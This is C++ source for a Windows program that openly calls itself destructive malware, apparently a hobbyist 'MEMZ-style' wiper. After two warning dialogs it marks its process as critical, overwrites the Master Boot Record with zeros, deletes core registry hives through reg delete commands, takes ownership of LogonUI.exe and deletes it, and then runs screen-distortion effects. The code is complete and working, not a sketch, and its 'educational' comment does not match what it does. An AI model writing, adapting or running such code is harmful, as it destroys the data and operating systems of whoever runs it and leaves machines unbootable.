#include <windows.h>
#include <iostream>
#include <ctime>
#include <cstdlib>
#include <cmath>
#include <mmsystem.h>
#pragma comment(lib, "winmm.lib")

// Funzione per visualizzare avvisi
void displayWarnings() {
    LPCWSTR title = L"! Warning !";
    LPCWSTR description = L"THIS IS MALWARE CODED BY Mattia. "
                          "This will cause irreparable destructive consequences, and the creator is "
                          "not responsible for any damage!\n\nPress \"Yes\" to continue.\nPress \"No\" to exit.";

    if (MessageBoxW(NULL, description, title, MB_ICONWARNING | MB_YESNO) == IDNO) {
        std::cout << "No pressed" << std::endl;
        exit(0);
    }

    title = L"!! LAST WARNING !!";
    description = L"This is the last warning! Pressing \"Yes\" will destroy your computer, for a very long time!\n"
                  "Are you sure you want to continue, resulting in an unbootable machine?!";

    if (MessageBoxW(NULL, description, title, MB_ICONWARNING | MB_YESNO) == IDNO) {
        std::cout << "Second no pressed" << std::endl;
        exit(0);
    }
}

// Funzione per sovrascrivere il Master Boot Record (MBR)
void overwriteMBR() {
    HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

    if (hDevice == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to access PhysicalDrive0 (" << GetLastError() << ").\n";
        return;
    }

    // Esempio di codice MBR (solo a scopo educativo e non un vero MBR)
    BYTE buffer[512] = {0};

    // Riempimento con dati per simulare la corruzione dell'MBR (questo esempio riempie con 0x00, che corrompe l'MBR)
    memset(buffer, 0x00, sizeof(buffer));

    DWORD bytesWritten;
    if (!WriteFile(hDevice, buffer, sizeof(buffer), &bytesWritten, NULL)) {
        std::cerr << "Failed to write to MBR (" << GetLastError() << ").\n";
    } else {
        std::cout << "Wrote " << bytesWritten << " bytes to the Master Boot Record successfully!" << std::endl;
    }

    CloseHandle(hDevice);
}

// Funzione per abilitare i privilegi necessari
BOOL EnablePriv(LPCSTR lpszPriv) {
    HANDLE hToken;
    LUID luid;
    TOKEN_PRIVILEGES tkprivs;
    ZeroMemory(&tkprivs, sizeof(tkprivs));

    if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))
        return FALSE;

    if (!LookupPrivilegeValue(NULL, lpszPriv, &luid)) {
        CloseHandle(hToken);
        return FALSE;
    }

    tkprivs.PrivilegeCount = 1;
    tkprivs.Privileges[0].Luid = luid;
    tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
    CloseHandle(hToken);
    return bRet;
}

// Funzione per impostare il processo come critico
BOOL ProcessIsCritical() {
    HANDLE hDLL;
    typedef VOID(_stdcall *RtlSetProcessIsCritical)(IN BOOLEAN NewValue, OUT PBOOLEAN OldValue, IN BOOLEAN IsWinlogon);
    RtlSetProcessIsCritical fSetCritical;

    hDLL = LoadLibraryA("ntdll.dll");
    if (hDLL != NULL) {
        EnablePriv(SE_DEBUG_NAME);
        fSetCritical = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hDLL, "RtlSetProcessIsCritical");
        if (!fSetCritical)
            return 0;
        fSetCritical(1, 0, 0);
        return 1;
    } else {
        return 0;
    }
}

// Funzione per eseguire un comando di sistema
void executeCommand(const std::string& command) {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    if (!CreateProcess(NULL, const_cast<char*>(command.c_str()), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        std::cerr << "CreateProcess failed (" << GetLastError() << ").\n";
        return;
    }

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

// Funzione per distorsione dello schermo usando BitBlt
void bitBltExample() {
    HDC hdc = GetDC(NULL);
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);

    time_t startTime = time(0);
    while (difftime(time(0), startTime) < 5) {
        BitBlt(hdc, 0, 0, screenWidth, screenHeight, hdc, -3, -3, NOTSRCCOPY);
    }

    ReleaseDC(NULL, hdc);
}

// Funzione per disegnare rettangoli casuali sullo schermo
void drawRandomRectangles() {
    HDC desk = GetDC(NULL);
    int x = GetSystemMetrics(SM_CXSCREEN);
    int y = GetSystemMetrics(SM_CYSCREEN);

    for (int i = 0; i < 100; i++) {
        HBRUSH brush = CreateSolidBrush(RGB(255, 30, 90));
        SelectObject(desk, brush);
        PatBlt(desk, rand() % x, rand() % y, rand() % x, rand() % y, PATINVERT);
        DeleteObject(brush);
        Sleep(10);
    }

    ReleaseDC(NULL, desk);
}

// Funzione per creare un effetto di shader arcobaleno sullo schermo
void rainbowShader() {
    HDC hdc = GetDC(NULL);
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);

    HDC memDC = CreateCompatibleDC(hdc);
    HBITMAP bitmap = CreateCompatibleBitmap(hdc, width, height);
    SelectObject(memDC, bitmap);

    BITMAPINFO bmi = {0};
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = width;
    bmi.bmiHeader.biHeight = -height;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 24;
    bmi.bmiHeader.biCompression = BI_RGB;

    unsigned char* image = new unsigned char[width * height * 3];

    for (int i = 0; i < height; ++i) {
        for (int j = 0; j < width; ++j) {
            int r = i % 256;
            int g = j % 256;
            int b = (i + j) % 256;
            image[(i * width + j) * 3 + 0] = b;
            image[(i * width + j) * 3 + 1] = g;
            image[(i * width + j) * 3 + 2] = r;
        }
    }

    SetDIBits(memDC, bitmap, 0, height, image, &bmi, DIB_RGB_COLORS);
    BitBlt(hdc, 0, 0, width, height, memDC, 0, 0, SRCAND);

    delete[] image;
    DeleteObject(bitmap);
    DeleteDC(memDC);
    ReleaseDC(NULL, hdc);
}

// Funzione per applicare l'effetto shader arcobaleno periodicamente
void shader1() {
    time_t startTime = time(0);
    while (difftime(time(0), startTime) < 10) {
        rainbowShader();
        Sleep(rand() % (6000 - 4000 + 1) + 4000);
    }
}

// Funzione per eseguire una distorsione dello schermo usando PatBlt
void patBltExample() {
    HDC desktopPtr = GetDC(NULL);
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);

    time_t startTime = time(0);
    int duration = 8;

    while (difftime(time(0), startTime) < duration) {
        PatBlt(desktopPtr, 0, 0, screenWidth, screenHeight, 0x005A0049);
        Sleep(100);
        PatBlt(desktopPtr, 0, 0, screenWidth, screenHeight, 0x005A0049);
        Sleep(100);
    }

    ReleaseDC(NULL, desktopPtr);
}

// Funzione per eliminare chiavi di registro specificate
void deleteRegistryKeys() {
    executeCommand("cmd.exe /c reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion /f");
    executeCommand("cmd.exe /c reg delete HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services /f");
    executeCommand("cmd.exe /c reg delete HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion /f");
}

// Funzione per eseguire le operazioni su LogonUI.exe
void executeLogonUIOperations() {
    executeCommand("cmd.exe /c takeown /f C:\\Windows\\System32\\LogonUI.exe");
    executeCommand("cmd.exe /c icacls C:\\Windows\\System32\\LogonUI.exe /grant administrators:F");
    executeCommand("cmd.exe /c del C:\\Windows\\System32\\LogonUI.exe");
}

int main() {
    FreeConsole(); // Nasconde la console
    ProcessIsCritical(); // Imposta il processo come critico

    // Mostra avvisi
    displayWarnings();

    // Sovrascrive il Master Boot Record
    overwriteMBR();

    // Esegue comandi per eliminare le chiavi di registro specificate
    deleteRegistryKeys();

    // Esegue operazioni su LogonUI.exe
    executeLogonUIOperations();

    // Esegue effetti di distorsione dello schermo
    bitBltExample();
    drawRandomRectangles();
    shader1();
    patBltExample();

    return 0;
}
